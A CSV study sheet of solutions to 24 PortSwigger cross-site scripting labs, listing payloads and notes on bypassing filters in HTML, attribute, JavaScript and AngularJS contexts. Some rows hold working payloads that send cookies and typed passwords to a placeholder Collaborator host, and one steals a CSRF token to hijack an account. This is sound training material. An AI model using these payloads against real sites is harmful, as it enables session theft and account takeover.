Number,Description,Command,Comments,Tags
1,Reflected XSS into HTML,<script>alert(1)</script>,"No encoding, use in search box","Apprentice, Reflected XSS"
2,Stored XSS into HTML,<script>alert(1)</script>,"No encoding, use in comment post","Apprentice, Stored XSS"
3,DOM XSS in document.write sink using source location.search,"""><svg onload=alert(1)>","Search box, inspect element to observe string has been placed inside an img src attribute. Payload breaks out of the img attribute","Apprentice, DOM XSS"
4,DOM XSS in innerHTML sink using source location.search,<img src=1 onerror=alert(1)>,"src value throws an error, which calls the alert function","Apprentice, DOM XSS"
5,DOM XSS in jQuery anchor href attribute sink using location.search source,javascript:alert(document.cookie),change returnPath in feedback?returnPath=/ to the payload. retrunPath is the query parameter which is placed in an href attribute,"Apprentice, DOM XSS"
6,DOM XSS in jQuery selector sink using a hashchange event,"<iframe src=""https://YOUR-LAB-ID.web-security-academy.net/#"" onload=""this.src+='<img src=x onerror=print()>'""></iframe>","uses jQuery's $()
 selector function to auto-scroll to a given post, whose title is passed via the location.hash
 property. This payload calls the print() function on the victim browser, consider using fetch() for exploitation. To use, store this in the body of the exploit server and deliver to victim","Apprentice, DOM XSS"
7,Reflected XSS into attribute with angle brackets HTML-encoded,"""onmouseover=""alert(1)","no angle brackets, only works when input is reflected inside a quoted attribute e.g <input type=text placeholder='Search the blog...' name=search value=""test"">","Apprentice, Reflected XSS"
8,Stored XSS into anchor href attribute with double quotes HTML-encoded,javascript:alert(1),"when the ‘website’ input is reflected inside an anchor href attribute
<img src=""/resources/images/avatarDefault.svg"" class=""avatar""> <a id=""author"" href=""randomtesttext"">","Apprentice, Stored XSS"
9,Reflected XSS into a JavaScript string with angle brackets HTML encoded,'-alert(1)-',"no angle brackets, only works when input is reflected inside a JavaScript string e.g. <script>
var searchTerms = 'kento';
document.write('<img src=""/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'"">');
</script>","Apprentice, Reflected XSS"
10,DOM XSS in document.write sink using source location.search inside a select element,"""></select><img%20src=1%20onerror=alert(1)>","start of the URL is product?productId=1&storeId=, this must be done as a new URL parameter, not as a body parameter. Add the storeId parameter to the URL, you can identify this is by the JavaScript extracts a storeId parameter from the http://location.search and uses document.write to create a new option.","DOM XSS, Practitioner"
11,DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded,{{$on.constructor('alert(1)')()}},ng-app attribute noted in the page source (AngularJS directive),"DOM XSS, Practitioner"
12,Reflected DOM XSS,"\""-alert(1)}//

""-alert(1)-""","<script>search('search-results')</script> where the searchResults.js file where the JSON response is used with an eval() function call. JSON response is escaping quotation marks. However, backslash is not being escaped","DOM XSS, Practitioner"
13,Stored DOM XSS,<><img src=1 onerror=alert(1)>,"website uses loadCommentsWithVulnerableEscapeHtml.js JavaScript function replace() to encode angle brackets. When the first argument is a string, it will only do this once, so this can be bypassed by providing an extra set of angle brackets at the beginning, which are encoded but the subsequent ones aren’t.","DOM XSS, Practitioner"
14,Exploiting cross-site scripting to steal cookies,"<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>",This script will make anyone who views the comment issue a POST request containing their cookie to your subdomain on the public Collaborator server.,"Practitioner, Stored XSS"
15,Exploiting cross-site scripting to capture passwords,"<input name=username id=username>
<input type=password name=password onchange=""if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});"">",This script will make anyone who views the comment issue a POST request containing their username and password to your subdomain of the public Collaborator server.,"Practitioner, Stored XSS"
16,Exploiting XSS to perform CSRF,"<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name=""csrf"" value=""(\w+)""/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>","issue a POST request to /my-account/change-email, with a parameter called email. There is an anti-CSRF token called ‘token’. The exploit loads the user account page, extracts the CSRF token and then uses the token to change the victims email address.

The script will make anyone who views the comment issue a POST request to change their email address to test@test.com","Practitioner, Stored XSS"
17,Reflected XSS into HTML context with most tags and attributes blocked,"<iframe src=""https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E"" onload=this.style.width='100px'>","A standard vector such as <img src=1 onerror=print()> is blocked.

Send search request to Burp Intruder. Replace value of search term with <>. Add § twice in between the brackets, i.e. <§§>.
Use the Portswigger XSS cheatsheet and “copy tags to clipboard”. Use these tags as a payload in Intruder, this will identify which tag is not blocked (e.g. body). <body%20=1> and ""Add §"" twice before the = sign (i.e. <body%20§§=1>).

Use XSS cheatsheet to copy events to clipboard, and use Intruder to send these payloads. This will identify an attribute (e.g. onresize) that is not blocked.

This allows you to craft the full payload, e.g. ""><body onresize=print()>"" onload=this.style.width='100px’

Make sure to URL encode special characters.","Practitioner, Reflected XSS"
18,Reflected XSS into HTML context with all tags blocked except custom ones,"<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>","creates a custom tag ‘x’, which contains an onfocus event handler that triggers the alert function. The # at the end of the URL focuses on this element as soon as the page is loaded, causing the alert payload to be called","Practitioner, Reflected XSS"
19,Reflected XSS with some SVG markup allowed,"https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E

<svG/x="">""/oNloaD=alert(""XSS"")//","<§§>, use XSS cheat sheet to load tags as payloads.
<svg> <animatetransform> <title>and <image>received a 200 response.
<svg><animatetransform%20§§=1>
XSS cheat sheet to copy events to clipboard.
onbegin is allowed, so you can craft the payload.
""><svg><animatetransform onbegin=alert(1)>.
Remember to URL encode special characters.","Practitioner, Reflected XSS"
20,Reflected XSS in canonical link tag,https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1),"sets the X key as an access key for the whole page. When a user presses the access key, the alert  function is called.","Practitioner, Reflected XSS"
21,Reflected XSS into a JavaScript string with single quote and backslash escaped,</script><script>alert(1)</script>,Inside a JavaScript string with single quotes and backslashes escaped. Observe that the random string in the search box has been reflected inside a JavaScript string. test'payload is escaped with a backslash.,"Practitioner, Reflected XSS"
22,Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped,\'-alert(1)//,Angle brackets and double quotes are HTML encoded and single quotes are escaped. Backslash is not escaped,"Practitioner, Reflected XSS"
23,Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped,http://foo?&apos;-alert(1)-&apos;,"In the Website input, input is reflected into the onclick event handler attribute.","Practitioner, Stored XSS"
24,"Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped",${alert(1)},Input reflected into JavaScript template string.,"Practitioner, Reflected XSS"
